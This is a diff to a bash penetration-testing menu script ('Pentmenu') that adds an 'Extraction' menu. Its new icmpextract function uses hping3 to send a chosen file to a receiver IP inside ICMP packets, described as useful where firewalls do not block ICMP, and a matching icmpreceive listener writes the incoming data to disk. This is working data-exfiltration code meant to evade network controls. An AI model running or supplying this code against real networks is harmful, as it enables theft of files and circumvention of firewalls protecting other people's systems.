@@ -3,7 +3,7 @@ PS3="Pentmenu>"
 ## MAINMENU
 mainmenu()
 {
-mainmenu=("Recon" "DOS" "Quit")
+mainmenu=("Recon" "DOS" "Extraction" "Quit")
 select opt in "${mainmenu[@]}"; do
 	if [ "$opt" = "Quit" ]; then
 	echo "Quitting" && sleep 1 && clear
@@ -12,6 +12,8 @@ select opt in "${mainmenu[@]}"; do
 reconmenu
 	elif [ "$opt" = "DOS" ]; then
 dosmenu
+    elif [ "$opt" = "Extraction" ]; then
+extractionmenu
 	else 
 	echo "That's not a valid option! Hit Return to show main menu"
 	fi
@@ -53,6 +55,27 @@ reconmenu()
   		echo  "That's not a valid option! Hit Return to show menu"
 	fi
 	done
+}
+
+## EXTRACTIONMENU
+extractionmenu()
+{
+        extractionmenu=("Extract File via ICMP" "Receive File via ICMP" "Go back")
+    select extractopt in "${extractionmenu[@]}"; do
+## Extract file via ICMP
+    if [ "$extractopt" = "Extract File via ICMP" ]; then
+        icmpextract
+## Receive file via ICMP
+    elif [ "$extractopt" = "Receive File via ICMP" ]; then
+        icmpreceive
+## Go back
+    elif [ "$extractopt" = "Go back" ]; then
+        mainmenu
+## Default error
+    else
+        echo "That's not a valid option! Hit Return to show menu"
+    fi
+    done
 }
 
 ## DOSMENU
@@ -436,6 +459,7 @@ read -i $SPEED -e SPEED
 : ${SPEED:=3}
 sudo nmap -Pn -sS -T $SPEED $TARGET --reason
 }
+## udp scan function
 udpscan()
 { echo "This module lets you scan a host/network for open UDP ports"
 echo "This may take some time"
@@ -445,6 +469,43 @@ echo "Enter the speed of scan (0 means very slow and 5 means fast).  Default is 
 read -i $SPEED -e SPEED
 : ${SPEED:=3}
 sudo nmap -Pn -sU -T $SPEED $TARGET --reason
+}
+## icmp file extraction function
+icmpextract()
+{ echo "This module will help you extract files via the ICMP protocol"
+  echo "It can be handy in a firewalled environment where ICMP is not blocked"
+  echo "You need an ICMP receiver for this to work (you or a friend can set it up via the receiver module)"
+  echo "Enter the receiver IP:"
+  read -i $RECEIVER -e RECEIVER
+  echo "Enter the FULL PATH of the file you want to extract"
+  read -i $EXTRACT -e EXTRACT
+  echo "What is your secret sign? (needs to be same on both ends)"
+  read -i $SECRET -e SECRET
+  SIZE=$(ls -l $EXTRACT | cut -d ' ' -f 5)
+  echo "Starting extraction.."
+  sudo hping3 $RECEIVER --icmp \
+  --sign $SECRET -d $SIZE -c 1 --file $EXTRACT
+  echo "Done. You can check the file integrity on the receiver using hash values"
+}
+## icmp receiver module
+icmpreceive()
+{ echo "This module will help you receive files via the ICMP protocol"
+  echo "It can be handy in a firewalled environment where ICMP is not blocked"
+  echo "You need an ICMP extractor for this to work (you or a friend can set it up via the extraction module)"
+  echo "Enter the extractor IP:"
+  read -i $EXTRACTOR -e EXTRACTOR
+  echo "Enter the network interface:"
+  read -i $INTERFACE -e INTERFACE
+  echo "Enter the outfile name (better to be same with the extracted file)"
+  read -i $OUTFILE -e OUTFILE
+  echo "What is your secret sign? (needs to be same on both ends)"
+  read -i $SECRET -e SECRET
+  echo "Starting listener.. Ctrl+C to stop when done."
+  sudo hping3 --listen $EXTRACTOR -I $INTERFACE \
+  --sign $SECRET > $OUTFILE
+  echo "Done, checking filetype.."
+  file $OUTFILE
+  echo "Done. You can check the integrity using hashing values"
 }
 ## create menu and show welcome message
 	clear && echo ""
